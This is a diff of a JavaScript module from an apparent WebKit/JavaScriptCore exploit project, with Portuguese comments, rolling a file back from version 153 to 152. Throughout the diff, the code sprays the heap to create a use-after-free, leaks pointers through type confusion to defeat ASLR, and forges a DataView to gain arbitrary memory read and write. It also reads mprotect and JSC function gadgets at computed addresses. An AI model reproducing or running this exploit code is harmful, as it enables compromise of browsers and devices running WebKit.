@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v153 - Refinamento do Spray UAF e Tamanho da Vítima - Agressivo + DEBUG ASLR LEAK)
+// js/script3/testArrayBufferVictimCrash.mjs (v152 - Refinamento do Spray UAF e Tamanho da Vítima - Agressivo)
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
 // 1. Validar primitivas básicas (OOB local).
@@ -25,7 +25,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v153_AGRESSIVO_DEBUG";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v152_AGRESSIVO";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -52,7 +52,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
-                    const byte = await arbReadFn(address.add(i + j), 1); // Removido logFn, arbReadFn já loga
+                    const byte = await arbReadFn(address.add(i + j), 1, logFn); // Note: logFn passado a arbReadFn
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
                     asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
@@ -80,13 +80,8 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
-    // IMPORTANTE: Este offset deve ser dentro do ArrayBuffer falso forjado para _fake_data_view,
-    // que por sua vez é o backing_array_buffer que foi corrompido.
-    // O m_vector do DataView está em 0x10 (ArrayBufferView.CONTENTS_IMPL_POINTER_OFFSET/M_VECTOR_OFFSET).
-    // O addrof_core(_fake_data_view) nos dá o endereço do "backing_array_buffer" em memória.
-    // Então, o m_vector do DataView falso é controlado pelo offset 0x10 dentro desse backing_array_buffer.
-    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET); // Revalidado para ArrayBufferView
-    
+    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
+
     // Salvamos/restauramos o m_vector usando arb_read/arb_write (OOB local)
     const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8); 
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);
@@ -117,7 +112,7 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
-    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET); // Revalidado para ArrayBufferView
+    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
     const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);
@@ -200,8 +195,8 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
         const test_target_js_object_addr = addrof_core(test_target_js_object);
 
         // Antes de testar o _fake_data_view, precisamos apontar o m_vector dele para o endereço do nosso objeto de teste.
-        // O m_vector do _fake_data_view é na verdade o JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET (0x10) dentro do `backing_array_buffer`.
-        const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET);
+        // O m_vector do _fake_data_view é na verdade o JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET dentro do `backing_array_buffer`.
+        const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
         await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, test_target_js_object_addr, 8, logFn);
 
         const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
@@ -226,7 +221,7 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
         try {
             if (backing_array_buffer) {
                 const backing_ab_addr = addrof_core(backing_array_buffer);
-                const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET);
+                const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
                 await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
             }
         } catch (cleanupErr) {
@@ -267,7 +262,7 @@ async function triggerGC(logFn, pauseFn) {
 // Cria um objeto, o coloca em uma estrutura que causa otimizações,
 // e retorna uma referência a ele após a estrutura ser destruída.
 // A lógica aqui é a do seu OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R50_UAF.mjs
-async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, addrof_primitive) {
+async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     let dangling_ref = null; // Esta será a referência pendurada
     const VICTIM_SIZE_BYTES = 0x80; // Tamanho do objeto vítima para UAF (128 bytes)
 
@@ -295,7 +290,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
     }
     
     logFn(`[UAF] Objeto vítima (Float64Array) criado e referência pendurada simulada.`, "info");
-    logFn(`[UAF] Endereço da referência pendurada (via addrof_core): ${addrof_primitive(dangling_ref).toString(true)}`, "info");
+    logFn(`[UAF] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_ref).toString(true)}`, "info");
     logFn(`[UAF] Valor inicial da ref. pendurada [0] (Float64): ${dangling_ref[0]} (Hex: ${toHex(_doubleToInt64_direct(dangling_ref[0]), 64)})`, "info");
 
     // PASSO 2: Forçar Coleta de Lixo para liberar a memória do 'victim_object_arr'
@@ -331,7 +326,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
     // Para o spray inicial, queremos que o valor lido seja um ponteiro para a Structure da DataView.
     // Um ponteiro de objeto em JSValue geralmente tem a tag 0x402a no high (para 64 bits).
     // O offset do vtable da DataView é 0x3AD62A0.
-    // Então o valor que queremos pulverizar é (possivelmente) um endereço como BASE_WEBKIT + OFFSET_VTABLE.
+    // Então o valor que queremos pulverizar para ser lido é (possivelmente) um endereço como BASE_WEBKIT + OFFSET_VTABLE.
     // Se a `addrof_core` já untagga, então o valor do spray **não deveria ter a tag**.
     // Mas se o Type Confusion resultou em um `Float64Array` sendo lido onde o `victim_object_arr` estava,
     // e esperamos que `dangling_ref[0]` nos dê um ponteiro `JSValue` (que tem a tag),
@@ -339,13 +334,10 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
 
     // Vamos assumir que a base da WebKit pode ser algo como 0x010000000000.
     // Isso é uma ESTIMATIVA. O valor real será vazado depois.
-    // Debug: Se a base vazada estiver em 0x1C40000000, e o offset for 0x3AD62A0,
-    // então o endereço final do vtable seria 0x1C43AD62A0.
-    // O valor taggeado seria 0x402a_1C43AD62A0.
     const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000); // Exemplo de base WebKit (apenas para simular um ponteiro)
     const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 0); // O offset já é um número em hexadecimal na config
 
-    let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_VTABLE_OFFSET_FROM_BASE_AI64);
+    let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
     
     // AQUI ESTÁ O TRUQUE: O valor que o JS lê como double na posição 0 é um JSValue.
     // JSValues que são ponteiros de objetos são "tagged". A tag comum para ponteiros de objeto (em doubles) é 0x402a no high.
@@ -358,9 +350,6 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
 
     const spray_value_double_to_leak_ptr = _int64ToDouble_direct(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64);
     logFn(`[UAF] Valor Double do VTable da Structure para pulverização (assumindo tag e base): ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}`, "info");
-    logFn(`[UAF] Debugging: TEMPORARY_ESTIMATED_WEBKIT_BASE: ${TEMPORARY_ESTIMATED_WEBKIT_BASE.toString(true)}`, "debug");
-    logFn(`[UAF] Debugging: DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64: ${DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64.toString(true)}`, "debug");
-    logFn(`[UAF] Debugging: TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 (original): ${TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64).toString(true)}`, "debug");
 
 
     for (let i = 0; i < SPRAY_COUNT_UAF_NEW; i++) {
@@ -382,7 +371,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
-    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v153_AGRESSIVO_DEBUG"; // Nome mais curto para logs internos
+    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v152_AGRESSIVO"; // Nome mais curto para logs internos
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");
 
     let final_result = { success: false, message: "Exploração falhou ou não pôde ser verificada.", details: {} };
@@ -443,7 +432,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         let leaked_jsvalue_from_uaf_double = 0; 
 
         try {
-            const dangling_ref_from_uaf = await sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, addrof_core);
+            const dangling_ref_from_uaf = await sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM);
 
             // --- FASE 5 do UAF original: Encontrar a referência corrompida e extrair os ponteiros ---
             if (!(dangling_ref_from_uaf instanceof Float64Array) || dangling_ref_from_uaf.length === 0) {
@@ -456,11 +445,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             for(let i = 0; i < attempts; i++) {
                 leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0]; // Lê o primeiro elemento do Float64Array sobreposto
                 if (typeof leaked_jsvalue_from_uaf_double === 'number' && !isNaN(leaked_jsvalue_from_uaf_double) && leaked_jsvalue_from_uaf_double !== 0) {
-                     logFn(`[UAF LEAK] Ponteiro Double lido da referência pendurada [0] (tentativa ${i+1}/${attempts}): ${toHex(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double), 64)} (RAW DOUBLE: ${leaked_jsvalue_from_uaf_double})`, "leak");
+                     logFn(`[UAF LEAK] Ponteiro Double lido da referência pendurada [0] (tentativa ${i+1}/${attempts}): ${toHex(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double), 64)}`, "leak");
                      break; // Se encontrou um valor que parece um ponteiro, sai
                 }
                 await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pequena pausa entre as tentativas
             }
+
 
             if (typeof leaked_jsvalue_from_uaf_double !== 'number' || isNaN(leaked_jsvalue_from_uaf_double) || leaked_jsvalue_from_uaf_double === 0) {
                  throw new Error(`Ponteiro vazado do UAF é inválido (double). Valor: ${leaked_jsvalue_from_uaf_double}. Provável falha de reocupação do heap.`);
@@ -493,32 +483,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             // Uma base válida deve ter os 12 bits menos significativos (os 3 últimos dígitos hex) como zero,
             // ou seja, ser alinhada a 0x1000. Também não pode ser zero.
             if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
-                // Debugging avançado: Tentar ajustar a base para o alinhamento mais próximo, se for apenas um erro de bits baixos
-                const original_low_base = webkit_base_address.low();
-                const aligned_low_base = (original_low_base & ~0xFFF); // Zerar os 12 bits menos significativos
-                const potential_aligned_base = new AdvancedInt64(aligned_low_base, webkit_base_address.high());
-                
-                logFn(`[ASLR LEAK] Base WebKit calculada (${webkit_base_address.toString(true)}) não alinhada a 0x1000.`, "warn");
-                logFn(`[ASLR LEAK] Sugestão de base alinhada: ${potential_aligned_base.toString(true)}.`, "warn");
-                
-                // Se a base vazada é sempre 0x07060504_03020100 e o offset do vtable é 0x3AD62A0,
-                // O problema não é o alinhamento da base, mas o valor *vazado* em si não ser o vtable.
-                // O valor 0x07060504_03020100 parece ser um ponteiro para uma Structure (baseada nos exemplos de leak).
-                // Mas a `ClassInfo` é diferente da `Structure`. A `dangling_ref[0]` deveria vazar o ponteiro para a **Structure** forjada.
-                // Isso sugere que o valor pulverizado está sendo lido, mas esse valor *não está apontando* para o vtable da Structure de DataView,
-                // ou que o `dangling_ref[0]` não está capturando o objeto pulverizado, mas sim algum outro valor de metadado.
-
-                // A verificação de alinhamento é válida. Se o resultado não é alinhado, a base está errada.
-                // O problema é mais fundamental: o que está sendo lido em `dangling_ref[0]` após o UAF?
-                // Se `0x07060504_03020100` é lido, e *se* isso fosse o ponteiro para a Structure (não o vtable em si, mas o ponteiro para a *instância* da Structure),
-                // então teríamos que ler o vtable dessa Structure.
-
-                // O log diz: `[ASLR LEAK] Endereço da Vtable da ClassInfo do dummy_object (dentro do WebKit): 0x07060504_03020100`
-                // Isso sugere que `untagged_uaf_addr` já é 0x07060504_03020100, e essa é a *vtable da ClassInfo*, não da Structure.
-                // Se o que estamos lendo é o Vtable da ClassInfo, então o offset do Vtable da DataView está sendo subtraído de algo incorreto.
-                // O UAF deveria vazar o ponteiro da Structure, não o vtable da ClassInfo diretamente.
-
-                throw new Error(`Base WebKit calculada (${webkit_base_address.toString(true)}) é inválida ou não alinhada. Vazamento de ASLR via UAF falhou. Ponteiro vazado original (untagged): ${untagged_uaf_addr.toString(true)}`);
+                throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Vazamento de ASLR via UAF falhou.`);
             }
             logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA UAF/TC: ${webkit_base_address.toString(true)}`, "good");
             
@@ -526,25 +491,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
             const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
             logFn(`[UAF LEAK] Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
-            const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4); // Usando a arb_read LOCAL
+            const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4, logFn); // Usando a arb_read LOCAL
             
             if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) { // Uma verificação mais robusta
                 logFn(`[UAF LEAK] LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
             } else {
                  logFn(`[UAF LEAK] ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando para endereços de código.`, "warn");
+                 // Se o gadget não puder ser lido, a arb_read local ainda pode estar limitada.
+                 // Mas, como UAF/TC foi bem-sucedido, prosseguimos para a universal R/W.
             }
-
-            // NOVA VERIFICAÇÃO: Ler outro gadget para aumentar a confiança
-            const jsobject_put_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"], 16), 0);
-            const jsobject_put_addr = webkit_base_address.add(jsobject_put_offset);
-            logFn(`[UAF LEAK] Verificando gadget JSC::JSObject::put em ${jsobject_put_addr.toString(true)} (para validar ASLR).`, "info");
-            const jsobject_put_first_bytes = await arb_read(jsobject_put_addr, 4);
-            if (jsobject_put_first_bytes !== 0 && jsobject_put_first_bytes !== 0xFFFFFFFF) {
-                logFn(`[UAF LEAK] LEITURA DE SEGUNDO GADGET CONFIRMADA: Primeiros bytes de JSC::JSObject::put: ${toHex(jsobject_put_first_bytes)}.`, "good");
-            } else {
-                logFn(`[UAF LEAK] ALERTA: Leitura do segundo gadget JSC::JSObject::put retornou zero ou FFFFFFFF.`, "warn");
-            }
-
 
         } catch (e_uaf_leak) {
             logFn(`[UAF LEAK] ERRO CRÍTICO no vazamento de ASLR via UAF/TC: ${e_uaf_leak.message}\n${e_uaf_leak.stack || ''}`, "critical");
